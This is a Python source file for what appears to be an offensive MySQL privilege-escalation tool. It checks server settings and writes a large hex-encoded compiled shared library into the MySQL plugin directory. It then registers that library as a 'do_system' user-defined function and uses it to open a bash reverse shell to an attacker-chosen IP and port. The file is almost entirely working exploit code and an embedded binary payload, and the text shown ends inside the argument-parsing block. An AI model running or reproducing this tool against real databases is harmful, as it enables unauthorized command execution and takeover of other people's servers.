#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

import mysql.connector
import sys
import time

logo='''
░▒▓██████████████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░
                                    ░▒▓█▓▒░
                                     ░▒▓██▓▒░
                Github==>https://github.com/MartinxMax
                S-H4CK13@Мартин. MSQP(Mysql Privilege Escalation tool)
'''



def execute_privilege(host, port, user, password, reverse_ip, reverse_port, plugins_path):
    try:
        connection = mysql.connector.connect(host=host, port=port, user=user, password=password)
        if connection.is_connected():
            cursor = connection.cursor()
            cursor.execute("SELECT * FROM mysql.func WHERE name = 'do_system';")
            result = cursor.fetchone()
            if not result:
                cursor.execute("SELECT UNHEX('7f454c4602010100000000000000000003003e000100000000000000000000004000000000000000283b000000000000000000004000380009004000210020000100000004000000000000000000000000000000000000000000000000000000d004000000000000d004000000000000001000000000000001000000050000000010000000000000001000000000000000100000000000006d010000000000006d0100000000000000100000000000000100000004000000002000000000000000200000000000000020000000000000cc00000000000000cc0000000000000000100000000000000100000006000000002e000000000000003e000000000000003e0000000000002802000000000000300200000000000000100000000000000200000006000000102e000000000000103e000000000000103e000000000000d001000000000000d0010000000000000800000000000000040000000400000038020000000000003802000000000000380200000000000024000000000000002400000000000000040000000000000050e57464040000000020000000000000002000000000000000200000000000002c000000000000002c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000002e000000000000003e000000000000003e000000000000000200000000000000020000000000000100000000000000040000001400000003000000474e55009506d1d237e672c2247d9fdb898cd9affefac2e6000000000200000006000000010000000600000000900080000000100600000007000000fd6730890f534f5d0000000000000000000000000000000000000000000000001000000020000000000000000000000000000000000000005800000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000002c00000020000000000000000000000000000000000000004600000022000000000000000000000000000000000000005500000012000c00091100000000000044000000000000005f00000012000c004d110000000000001700000000000000005f5f676d6f6e5f73746172745f5f005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a6500646f5f73797374656d00646f5f73797374656d5f696e6974006c6962632e736f2e36004834434b31335f5544462e736f00474c4942435f322e322e350000000100020001000100020001000100000000000000010001006e0000001000000000000000751a6909000002008600000000000000003e00000000000008000000000000000011000000000000083e0000000000000800000000000000c010000000000000204000000000000008000000000000002040000000000000e03f00000000000006000000010000000000000000000000e83f00000000000006000000030000000000000000000000f03f00000000000006000000040000000000000000000000f83f0000000000000600000005000000000000000000000018400000000000000700000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004883ec08488b05dd2f00004885c07402ffd04883c408c3000000000000000000ff35e22f0000ff25e42f00000f1f4000ff25e22f00006800000000e9e0ffffffff25b22f000066900000000000000000488d3dd12f0000488d05ca2f00004839f87415488b05762f00004885c07409ffe00f1f8000000000c30f1f8000000000488d3da12f0000488d359a2f00004829fe4889f048c1ee3f48c1f8034801c648d1fe7414488b05452f00004885c07408ffe0660f1f440000c30f1f8000000000f30f1efa803d5d2f000000752b5548833d222f0000004889e5740c488b3d3e2f0000e859ffffffe864ffffffc605352f0000015dc30f1f00c30f1f8000000000f30f1efae977ffffff554889e54883ec2048897df8488975f0488955e848894de0488b45f08b0083f8017407b800000000eb18488b45f0488b4010488b004889c7e8eafeffffb800000000c9c3554889e548897df8488975f0488955e8b8000000005dc34883ec084883c408c30000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011b033b2c0000000400000020f0ffff4800000040f0ffff7000000009f1ffff880000004df1ffffa8000000000000001400000000000000017a5200017810011b0c070890010000240000001c000000d0efffff20000000000e10460e184a0f0b770880003f1a3b2a332422000000001400000044000000c8efffff0800000000000000000000001c0000005c00000079f0ffff4400000000410e108602430d067f0c07080000001c0000007c0000009df0ffff1700000000410e108602430d06520c07080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011000000000000c01000000000000001000000000000006e000000000000000e0000000000000078000000000000000c0000000000000000100000000000000d0000000000000064110000000000001900000000000000003e0000000000001b0000000000000008000000000000001a00000000000000083e0000000000001c000000000000000800000000000000f5feff6f00000000600200000000000005000000000000004803000000000000060000000000000088020000000000000a0000000000000092000000000000000b0000000000000018000000000000000300000000000000004000000000000002000000000000001800000000000000140000000000000007000000000000001700000000000000b804000000000000070000000000000010040000000000000800000000000000a80000000000000009000000000000001800000000000000feffff6f00000000f003000000000000ffffff6f000000000100000000000000f0ffff6f00000000da03000000000000f9ffff6f00000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000103e00000000000000000000000000000000000000000000361000000000000020400000000000004743433a202844656269616e2031312e332e302d31292031312e332e30002c00000002000000000008000000000009110000000000005b00000000000000000000000000000000000000000000002b0200000500010800000000083d0000001d000000000d00000009110000000000005b0000000000000000000000010807090100000104070e010000010108b50000000102076a010000010106b700000001020559010000090405696e74000108053d010000036b000000010106be0000000a6b000000037200000001080538010000010807040100000b08000000070435000000013a06b500000005d80000000005a900000001054601000002059e00000003000614000000283cfd00000002890000003d10350000000002cf0000003e14fd00000008021b0000003f0c020100001002510100004012070100001802f9000000410a660000002000038a0000000366000000032e000000073400000042b500000006c300000020445f01000002f900000045096b00000000022000000046103500000004029300000047122e000000080c7074720001480a6600000010022900000049096b000000180007f00000004a160100000de9000000029b030c58000000800100000e77000000000f230100000156066b0000004d110000000000001700000000000000019ccd0100000463010000561fcd010000029168041b0000005631d20100000291600400000000563d6600000002915800035f010000030c01000010e6000000014c055800000009110000000000004400000000000000019c04630100004c19cd010000029168041b0000004c2bd2010000029160041b0100004c376600000002915804320100004c466600000002915000000124000b0b3e0b030e0000020d00030e3a21013b0b390b4913380b0000030f000b210849130000040500030e3a21013b0b390b491302180000052800030e1c0b0000061301030e0b0b3a21013b0b39211001130000071600030e3a21013b0b39210349130000081101250e130b031f1b1f11011207101700000924000b0b3e0b030800000a2600491300000b0401030e3e0b0b0b49133a0b3b0b390b011300000c0d0003083a0b3b0b390b4913380b00000d2e013f19030e3a0b3b05390b271949133c19011300000e0500491300000f2e013f19030e3a0b3b0b390b271949131101120740187a1901130000102e013f19030e3a0b3b0b390b271949131101120740187c190000006e0000000500080033000000010101fb0e0d00010101010000000100000101011f020d0000002200000002011f020f03000000000000000000002f000000010501000902091100000000000003cc0001050a0875050566050959050d760502820508ae050159310508f305015902020001016d657373616765004974656d5f726573756c740073745f7564665f6172677300646563696d616c7300636f6e73745f6974656d005544465f4152475300474e55204331372031312e332e30202d6d74756e653d67656e65726963202d6d617263683d7838362d3634202d67202d666173796e6368726f6e6f75732d756e77696e642d7461626c6573006172675f636f756e74006d61785f6c656e67746800524f575f524553554c54005245414c5f524553554c5400756e7369676e656420636861720073745f7564665f696e6974006172675f7479706500535452494e475f524553554c5400646f5f73797374656d005544465f494e4954006d617962655f6e756c6c006c6f6e67206c6f6e6720756e7369676e656420696e740069735f6e756c6c00646f5f73797374656d5f696e6974006572726f72006c6f6e67206c6f6e6720696e7400494e545f524553554c54006c656e677468730073686f727420696e7400696e697469640073686f727420756e7369676e656420696e74004834434b31335f5544462e63002f686f6d652f6d6170746e682f4465736b746f70002f7573722f696e636c756465007374646c69622e680000000000000000000000000000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000002000c00501000000000000000000000000000000e00000002000c00801000000000000000000000000000002100000002000c00c01000000000000000000000000000003700000001001600284000000000000001000000000000004300000001001100083e00000000000000000000000000006a00000002000c00001100000000000000000000000000007600000001001000003e0000000000000000000000000000950000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000a200000001000f00c8200000000000000000000000000000000000000400f1ff00000000000000000000000000000000b000000002000d0064110000000000000000000000000000b60000000100150020400000000000000000000000000000c300000001001200103e0000000000000000000000000000cc00000000000e0000200000000000000000000000000000df0000000100150028400000000000000000000000000000eb00000001001400004000000000000000000000000000003901000002000900001000000000000000000000000000000101000020000000000000000000000000000000000000001d01000012000000000000000000000000000000000000003001000012000c004d1100000000000017000000000000003f01000012000c00091100000000000044000000000000004901000020000000000000000000000000000000000000005801000020000000000000000000000000000000000000007201000022000000000000000000000000000000000000000063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e30005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279004834434b31335f5544462e63005f5f4652414d455f454e445f5f005f66696e69005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f005f49544d5f64657265676973746572544d436c6f6e655461626c650073797374656d40474c4942435f322e322e3500646f5f73797374656d5f696e697400646f5f73797374656d005f5f676d6f6e5f73746172745f5f005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a6540474c4942435f322e322e3500002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e74002e64656275675f6172616e676573002e64656275675f696e666f002e64656275675f616262726576002e64656275675f6c696e65002e64656275675f737472002e64656275675f6c696e655f737472000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000003802000000000000380200000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000600200000000000060020000000000002800000000000000030000000000000008000000000000000000000000000000380000000b000000020000000000000088020000000000008802000000000000c0000000000000000400000001000000080000000000000018000000000000004000000003000000020000000000000048030000000000004803000000000000920000000000000000000000000000000100000000000000000000000000000048000000ffffff6f0200000000000000da03000000000000da03000000000000100000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000f003000000000000f00300000000000020000000000000000400000001000000080000000000000000000000000000006400000004000000020000000000000010040000000000001004000000000000a8000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000b804000000000000b804000000000000180000000000000003000000140000000800000000000000180000000000000078000000010000000600000000000000001000000000000000100000000000001700000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000002010000000000000201000000000000020000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000401000000000000040100000000000000800000000000000000000000000000008000000000000000800000000000000870000000100000006000000000000005010000000000000501000000000000014010000000000000000000000000000100000000000000000000000000000008d00000001000000060000000000000064110000000000006411000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000002000000000000000200000000000002c00000000000000000000000000000004000000000000000000000000000000a1000000010000000200000000000000302000000000000030200000000000009c00000000000000000000000000000008000000000000000000000000000000ab0000000e0000000300000000000000003e000000000000002e0000000000000800000000000000000000000000000008000000000000000800000000000000b70000000f0000000300000000000000083e000000000000082e0000000000000800000000000000000000000000000008000000000000000800000000000000c3000000060000000300000000000000103e000000000000102e000000000000d00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000e03f000000000000e02f0000000000002000000000000000000000000000000008000000000000000800000000000000cc000000010000000300000000000000004000000000000000300000000000002000000000000000000000000000000008000000000000000800000000000000d5000000010000000300000000000000204000000000000020300000000000000800000000000000000000000000000008000000000000000000000000000000db000000080000000300000000000000284000000000000028300000000000000800000000000000000000000000000001000000000000000000000000000000e0000000010000003000000000000000000000000000000028300000000000001e00000000000000000000000000000001000000000000000100000000000000e9000000010000000000000000000000000000000000000046300000000000003000000000000000000000000000000001000000000000000000000000000000f8000000010000000000000000000000000000000000000076300000000000002f02000000000000000000000000000001000000000000000000000000000000040100000100000000000000000000000000000000000000a5320000000000000801000000000000000000000000000001000000000000000000000000000000120100000100000000000000000000000000000000000000ad3300000000000072000000000000000000000000000000010000000000000000000000000000001e01000001000000300000000000000000000000000000001f340000000000007d010000000000000000000000000000010000000000000001000000000000002901000001000000300000000000000000000000000000009c350000000000003800000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000d83500000000000088020000000000001f000000140000000800000000000000180000000000000009000000030000000000000000000000000000000000000060380000000000008d01000000000000000000000000000001000000000000000000000000000000110000000300000000000000000000000000000000000000ed390000000000003901000000000000000000000000000001000000000000000000000000000000') INTO DUMPFILE '/tmp/H4CK13_UDF.so';")
                print("[*] Payload Loading....")
                time.sleep(6)
                cursor.execute("USE mysql;")
                cursor.execute("CREATE TABLE IF NOT EXISTS foo(line BLOB);")
                cursor.execute("INSERT INTO foo VALUES(LOAD_FILE('/tmp/H4CK13_UDF.so'));")
                cursor.execute(f"SELECT * FROM foo LIMIT 1 INTO DUMPFILE '{plugins_path}H4CK13_UDF.so';")
                cursor.execute("CREATE FUNCTION do_system RETURNS INTEGER SONAME 'H4CK13_UDF.so';")
                print("[+] Done.")
            print("[+] Reverse Shell Done.")
            cursor.execute(f"SELECT do_system('bash -c \"bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1\"');")
            connection.reset_session()
    except mysql.connector.Error as e:
        print(f"[!] Error: {e}")
    finally:
        if connection and connection.is_connected():
            cursor.close()
            connection.close()
            print("[+] MySQL connection closed.")

def check_mysql_permissions(host, port, user, password):
    try:
        connection = mysql.connector.connect(host=host, port=port, user=user, password=password)
        if connection.is_connected():
            print(f"[+] Connected to MySQL database at {host}:{port}...")
            cursor = connection.cursor(dictionary=True)
            cursor.execute("USE mysql;")
            cursor.execute("SELECT DATABASE();")
            db = cursor.fetchone()
            if db and db['DATABASE()']:
                print("[*] MySQL database detected.")
            else:
                print("[!] Error: Not connected to a MySQL database.")
                return
            cursor.execute("SHOW VARIABLES LIKE '%plugin%';")
            plugins_path = cursor.fetchall()
            plugin_dir = ""
            for row in plugins_path:
                if row['Variable_name'] == 'plugin_dir':
                    plugin_dir = row['Value']
                    print(f"[+] Plugins Path: {plugin_dir}")
            cursor.execute("SHOW VARIABLES LIKE '%secure_file_priv%';")
            secure_file_priv = cursor.fetchall()
            secure_file_priv_value = ""
            for row in secure_file_priv:
                if row['Variable_name'] == 'secure_file_priv':
                    secure_file_priv_value = row['Value']
                    print(f"[+] secure_file_priv: {'NO' if not secure_file_priv_value else 'YES'}")
            cursor.execute("SELECT VERSION();")
            version_result = cursor.fetchone()
            mysql_version = version_result['VERSION()']
            print(f"[+] MySQL Version: {mysql_version}")
            version_parts = [int(part) for part in mysql_version.split('.')[0:2]]
            if (version_parts[0] > 5) or (version_parts[0] == 5 and version_parts[1] > 1):
                if not secure_file_priv_value:
                    return plugin_dir
            else:
                print("[-] MySQL version is not greater than 5.1.")
    except mysql.connector.Error as e:
        if e.errno == 1045:
            print("[!] Error: Access denied. Please check your username and password.")
        else:
            print(f"[!] Error: {e}")
    finally:
        if connection and connection.is_connected():
            cursor.close()
            connection.close()

if __name__ == "__main__":
    print(logo)
    if len(sys.argv) != 7:
